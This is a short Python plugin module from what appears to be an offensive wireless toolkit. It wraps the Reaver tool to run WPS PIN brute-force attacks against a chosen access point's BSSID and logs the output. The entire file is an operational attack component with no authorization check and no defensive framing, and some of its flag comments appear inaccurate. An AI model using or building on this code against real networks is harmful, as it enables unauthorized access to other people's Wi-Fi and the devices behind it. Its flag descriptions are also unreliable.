# backend/plugins/wps_attack.py
"""
Module: wps_attack
Wraps the Reaver tool to perform WPS brute-force attacks.
"""
import subprocess
import logging
import os

logger = logging.getLogger("wps_attack")
logger.setLevel(logging.INFO)
handler = logging.StreamHandler()
formatter = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
handler.setFormatter(formatter)
logger.addHandler(handler)

class WPSAttack:
    def __init__(self, iface: str, target_bssid: str, output_dir: str = '/tmp/reaver_output'):
        self.iface = iface
        self.bssid = target_bssid
        self.output_dir = output_dir
        os.makedirs(self.output_dir, exist_ok=True)

    def run(self, timeout: int = 3600, multi: bool = False):
        cmd = [
            'reaver',
            '-i', self.iface,
            '-b', self.bssid,
            '-vv',
            '-d', '5',            # delay between attempts
            '-t', str(timeout),   # overall timeout
            '-o', os.path.join(self.output_dir, f'reaver_{self.bssid}.log')
        ]
        if multi:
            cmd.append('-M')  # use multi-threaded

        logger.info(f"Starting WPS attack: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in proc.stdout:
            logger.info(line.strip())
        proc.wait()
        logger.info(f"WPS attack completed with exit code {proc.returncode}")
        return proc.returncode
